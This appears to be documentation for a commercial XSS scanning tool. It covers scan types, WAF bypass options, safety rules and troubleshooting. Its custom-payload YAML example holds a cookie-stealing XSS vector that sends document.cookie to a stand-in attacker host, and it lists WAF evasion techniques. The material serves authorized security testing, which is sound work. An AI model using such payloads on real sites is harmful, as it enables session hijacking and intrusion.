XSS Scanner Pro

Advanced cross-site scripting detection and WAF bypass testing for security professionals.

Overview

XSS Scanner Pro is a comprehensive security testing tool designed to identify reflected, stored, DOM-based, and blind XSS vulnerabilities in web applications. It includes advanced WAF bypass detection, payload customization, and safe production testing capabilities.

  • Reflected XSS: Detects payloads reflected in HTTP responses
  • Stored XSS: Identifies persistent payloads in databases and storage
  • DOM XSS: Analyzes client-side JavaScript execution paths
  • Blind XSS: Out-of-band detection via callback servers
  • WAF Bypass: Tests evasion techniques against common WAFs

Quick Start

  1. Install via npm: npm install -g @edgeiq/xss-scanner-pro
  2. Authenticate: xss-scanner auth login
  3. Run a basic scan: xss-scanner scan --target https://example.com
  4. View results: xss-scanner report --format html
# Example: Quick reflected XSS test
xss-scanner scan --target https://app.example.com/search \
  --type reflected \
  --param q \
  --output results.json

Scan Types

Reflected XSS

Tests user input that is immediately reflected in the HTTP response without storage. Ideal for search forms, error pages, and URL parameters.

xss-scanner scan --target https://example.com/page \
  --type reflected \
  --params "q,name,id"

Stored XSS

Detects payloads persisted in backend storage (databases, files) and rendered on subsequent requests. Requires authenticated sessions for most targets.

xss-scanner scan --target https://example.com/profile \
  --type stored \
  --auth-cookie "session=abc123" \
  --fields "bio,username,comment"

DOM XSS

Analyzes client-side JavaScript sinks (innerHTML, eval, document.write) using headless browser instrumentation. No server-side reflection required.

xss-scanner scan --target https://spa.example.com \
  --type dom \
  --browser chrome \
  --timeout 30

Blind XSS

Uses out-of-band callbacks to detect XSS in contexts where payloads execute asynchronously (admin panels, email renderers, log viewers).

xss-scanner scan --target https://example.com/contact \
  --type blind \
  --callback https://your-callback.edgeiq.io/xss \
  --delay 60

WAF Bypass Testing

XSS Scanner Pro includes a library of WAF evasion techniques to test whether security controls properly block malicious payloads.

  • Encoding: URL, HTML entity, Unicode, Base64
  • Case variation: Mixed case tags and attributes
  • Whitespace injection: Tabs, newlines, comments
  • Polyglot payloads: Context-aware multi-vector tests
  • Browser-specific: Chrome/Firefox/Safari quirks
xss-scanner scan --target https://protected.example.com \
  --waf-bypass \
  --techniques encoding,polyglot,whitespace

Payload Customization

Create custom payload templates in YAML format for organization-specific testing requirements.

# custom-payloads.yaml
payloads:
  - name: "SVG Onload"
    vector: "<svg/onload=alert(1)>"
    contexts: [html, attribute]
  - name: "Event Handler"
    vector: "<img src=x onerror=fetch('https://attacker.com/'+document.cookie)>"
    contexts: [html]
    waf_bypass: true
xss-scanner scan --target https://example.com \
  --payloads custom-payloads.yaml

Safe Production Testing Rules

⚠️ Critical: Never test systems without explicit written authorization. Unauthorized scanning may violate computer fraud laws.
  • Obtain signed scope agreement before testing
  • Use non-destructive payloads only (no data exfiltration)
  • Rate-limit requests to avoid service disruption
  • Test during maintenance windows when possible
  • Disable blind XSS callbacks on sensitive environments
  • Log all scan activity for audit compliance
  • Immediately stop if unexpected errors occur

Troubleshooting

No vulnerabilities detected

  • Verify target URL is accessible and not behind IP whitelist
  • Check authentication credentials are valid
  • Increase timeout for slow-loading SPAs
  • Enable verbose logging: --verbose debug

False positives

  • Review payload context (attribute vs. HTML body)
  • Check CSP headers blocking execution
  • Validate with manual browser testing

WAF blocks all requests

  • Enable --waf-bypass with encoding techniques
  • Reduce request rate with --rate-limit 5
  • Rotate user agents: --rotate-ua
